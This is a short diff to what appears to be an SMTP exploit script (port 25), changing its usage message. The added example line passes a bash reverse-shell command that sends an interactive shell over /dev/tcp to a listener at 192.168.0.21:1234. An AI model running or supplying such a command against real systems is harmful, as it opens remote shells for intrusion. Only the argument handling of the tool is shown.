@@ -40,7 +40,9 @@ banner2 = """
 
 if len(sys.argv) < 5:
     print("[!]Need more arguments!!!!")
-    print(f"usage: {sys.argv[0]} <host> <port> <command> <name@host>")
+    print(f"usage: ./{sys.argv[0]} <host> <port> <command> <name@host>")
+    print(f"example: ./{sys.argv[0]} 192.168.0.4 25 'bash -c \"exec bash -i &> /dev/tcp/192.168.0.21/1234 <&1\"' user@ubuntu.test")
+    
     sys.exit()
 
 print(banner)
